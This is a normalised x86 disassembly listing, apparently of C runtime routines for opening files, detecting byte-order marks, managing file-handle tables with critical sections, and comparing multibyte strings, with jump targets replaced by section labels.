mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_40d20d
and [ eax ] 0x0
mov [ esi ] ebx
call sub_40d1fa
mov [ eax ] 0x18
call sub_40d1fa
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_40d220
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_40d220
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_40d1fa
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_4179b7
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_41b5bb
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_40fea4
add esp 0xc
test eax eax
jne r-xdata
call sub_40d20d
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_41b5bb
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_4119cb
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_40d220
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_417a38
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_41b302
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_40fea4
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_413695
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_413695
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_4119cb
pop ecx
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_41b5bb
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_410fa5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_41b5bb
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_413695
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_413695
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_417337
push 0x14
push r--data
call sub_40f510
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x20 ] edi
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
call sub_416c03
add esp 0x14
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4173ab
mov esi [ ebp - 0x24 ]
cmp esi edi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
mov eax [ ebp - 0x1c ]
call sub_40d1fa
mov [ eax ] esi
jmp r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
sub_4173ab
cmp [ ebp - 0x20 ] edi
je r-xdata
retn
cmp [ ebp - 0x24 ] edi
je r-xdata
push [ ebp - 0x1c ]
call sub_417bc6
pop ecx
mov eax [ ebp - 0x1c ]
sar eax 0x5
mov ecx [ ebp - 0x1c ]
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_4173e5
push 0x14
push r--data
call sub_40f510
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_40f555
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_416c03
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41747b
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_41747b
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_417bc6
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rwxdata ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_4174a9
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4173e5
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_4174db
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4173e5
add esp 0x18
pop ebp
retn
sub_4174fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_40d831
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b9fb
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_417719
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ba4e
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_417880
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4178a0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40b946
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_4178e5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4178e5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4178a0
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_417995
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4179b4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_417995
push ebx
push ecx
mov ebx rwxdata
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4179b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rwxdata ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rwxdata ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_417a38
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rwxdata ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rwxdata ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_417abe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_417b27
push 0xc
push r--data
call sub_40f510
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40f555
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417bbd
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_417bc6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417bed
push 0x18
push r--data
call sub_40f510
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_40f348
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417d7d
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rwxdata ]
test esi esi
je r-xdata
call sub_40f555
retn
push 0x40
push 0x20
call sub_40ef0a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rwxdata ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rwxdata ]
mov [ ecx ] eax
add [ rwxdata ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_417b27
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_40f40a
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_417cbf
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rwxdata ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_417d86
push 0xc
push r--data
call sub_40f510
xor edi edi
mov [ ebp - 0x1c ] edi
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40d220
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_417bed
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push esi
call sub_4179b7
pop ecx
pop ecx
or bl 0x1
mov eax esi
sar eax 0x5
lea ecx [ eax * 4 + rwxdata ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov edx [ ecx ]
mov [ edx + eax + 0x4 ] bl
mov edx [ ecx ]
lea edx [ edx + eax + 0x24 ]
and [ edx ] 0x80
mov ecx [ ecx ]
lea eax [ ecx + eax + 0x24 ]
and [ eax ] 0x7f
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417e74
cmp [ ebp - 0x1c ] edi
je r-xdata
call sub_40d1fa
mov [ eax ] 0x18
call sub_40d20d
mov [ eax ] edi
jmp r-xdata
or eax 0xffffffff
mov eax esi
jmp r-xdata
call sub_40f555
retn
sub_417e74
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_417bc6
pop ecx
retn
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_417e9c
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
